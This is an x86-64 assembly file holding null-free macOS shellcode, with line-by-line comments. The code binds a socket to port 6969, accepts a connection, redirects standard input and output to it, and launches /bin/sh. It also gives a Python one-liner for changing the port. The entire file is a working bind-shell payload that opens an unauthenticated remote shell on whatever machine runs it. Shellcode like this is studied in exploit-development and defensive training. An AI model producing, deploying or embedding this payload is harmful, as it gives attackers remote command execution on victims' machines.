; non-NULL shellcode running /bin/sh and listening on port 6969
; change the port using Python:
;   $ python -c "import socket; print(hex(socket.htons(PORT)))"
BITS 64
global start
section .text

start:
  push 0x2
  pop r12
  shl r12, 0x18 ; r12 = 0x0000000002000000 (macOS syscall base)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; int sock = socket(AF_INET, SOCK_STREAM, 0)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  mov rax, r12
  mov al, 0x61  ; rax = socket system call number (97 AUE_SOCKET)
  push 0x2
  pop rdi       ; rdi = AF_INET
  push 0x1
  pop rsi       ; rsi = SOCK_STREAM
  xor rdx, rdx  ; rdx = 0
  syscall
  xchg rdi, rax ; store file descriptor in rdi
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; struct sockaddr_in address
  ; address.sin_family = AF_INET
  ; address.sin_port = htons(PORT)
  ; address.sin_addr.s_addr = INADDR_ANY
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  push rdx
  push rdx                   ; create 16 byte NULL buffer on stack
  mov byte [rsp], 0x2        ; store AF_INET at address.sin_family
  mov word [rsp + 2], 0x391b ; store PORT at address.sin_port
  mov rsi, rsp               ; rsi = &address on the stack
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; bind(sock, (struct sockaddr *)&address, sizeof(address))
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  mov rax, r12
  mov al, 0x68 ; rax = bind system call number (104 AUE_BIND)
  mov dl, 0x10 ; rdx = sizeof(struct sockaddr)
  syscall      ; rdi = socket file descriptor and rsi = &(address)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; listen(sock, 0)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  mov rax, r12
  mov al, 0x6a ; rax = listen system call number (106 AUE_LISTEN)
  xor rsi, rsi ; rsi = 0
  syscall      ; rdi still holds socket file descriptor
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; int new_sock = accept(sock, NULL, NULL)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  xor dl, dl    ; zero rdx
  mov rax, r12
  mov al, 0x1e  ; rax = accept system call number (30 AUE_ACCEPT)
  syscall       ; rsi = 0 still
  xchg rdi, rax ; store client socket (new_sock) in rdi
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; dup(new_sock, 0)
  ; dup(new_sock, 1)
  ; dup(new_sock, 2)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  push 0x2
  pop rsi       ; rsi = STDERR file descriptor number
dup:
  mov rax, r12
  mov al, 0x5a  ; rax = dup2 system call number (90 AUE_DUP2)
  syscall       ; rdi still holds client socket file descriptor
  dec esi       ; cycle through STDIN and STDOUT descriptors
  jns dup
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  ; execve("/bin/sh", NULL, NULL)
  ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  xor rsi, rsi                ; rsi = 0
  push rdx                    ; push NULL onto the stack (rdx still zero)
  mov rbx, 0x68732f6e69622f2f ; "//bin/sh" in reverse order
  push rbx                    ; push string onto the stack
  mov rdi, rsp                ; set rdi = address of string on stack
  mov rax, r12
  mov al, 0x3b                ; rax = execve system call number (59 AUE_EXECVE)
  syscall


